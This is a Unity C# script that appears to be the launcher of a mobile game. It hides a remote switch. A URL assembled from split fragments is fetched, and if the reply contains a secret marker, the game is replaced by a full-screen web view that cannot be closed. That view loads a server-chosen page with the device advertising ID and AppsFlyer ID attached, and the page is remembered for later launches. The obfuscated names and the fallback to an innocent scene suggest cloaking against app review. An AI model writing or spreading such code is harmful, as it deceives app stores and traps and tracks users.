using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainFF : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneFFname = "";
    [HideInInspector] public string twoFFname = "";
    [SerializeField] private GameObject _blackBG;


   

    private void ethmoidFFlook(string PleadFFinvolve, string NamingFF = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _obligesFF = gameObject.AddComponent<UniWebView>();
        _blackBG.SetActive(true);
        _obligesFF.SetToolbarDoneButtonText("");
        switch (NamingFF)
        {
            case "0":
                _obligesFF.SetShowToolbar(true, false, false, true);
                break;
            default:
                _obligesFF.SetShowToolbar(false);
                break;
        }
        _obligesFF.Frame = Screen.safeArea;
        _obligesFF.OnShouldClose += (view) =>
        {
            return false;
        };
        _obligesFF.SetSupportMultipleWindows(true);
        _obligesFF.SetAllowBackForwardNavigationGestures(true);
        _obligesFF.OnMultipleWindowOpened += (view, windowId) =>
        {
            _obligesFF.SetShowToolbar(true);

        };
        _obligesFF.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingFF)
            {
                case "0":
                    _obligesFF.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _obligesFF.SetShowToolbar(false);
                    break;
            }
        };
        _obligesFF.OnOrientationChanged += (view, orientation) =>
        {
            _obligesFF.Frame = Screen.safeArea;
        };
        _obligesFF.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("PleadFFinvolve", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("PleadFFinvolve", url);
            }
        };
        _obligesFF.Load(PleadFFinvolve);
        _obligesFF.Show();
    }


    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaFF") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneFFname = advertisingId; });
        }
    }



    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("PleadFFinvolve", string.Empty) != string.Empty)
            {
                ethmoidFFlook(PlayerPrefs.GetString("PleadFFinvolve"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoFFname += n;
                }
                StartCoroutine(IENUMENATORFF());
            }
        }
        else
        {
            StartFF();
        }
    }



    private void StartFF()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("SampleScene");
    }    






    private IEnumerator IENUMENATORFF()
    {
        using (UnityWebRequest ff = UnityWebRequest.Get(twoFFname))
        {

            yield return ff.SendWebRequest();
            if (ff.isNetworkError)
            {
                StartFF();
            }
            int entityFF = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && entityFF > 0)
            {
                yield return new WaitForSeconds(1);
                entityFF--;
            }
            try
            {
                if (ff.result == UnityWebRequest.Result.Success)
                {
                    if (ff.downloadHandler.text.Contains("FrtFlpprHWfg"))
                    {

                        try
                        {
                            var subs = ff.downloadHandler.text.Split('|');
                            ethmoidFFlook(subs[0] + "?idfa=" + oneFFname, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            ethmoidFFlook(ff.downloadHandler.text + "?idfa=" + oneFFname + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        StartFF();
                    }
                }
                else
                {
                    StartFF();
                }
            }
            catch
            {
                StartFF();
            }
        }
    }



}
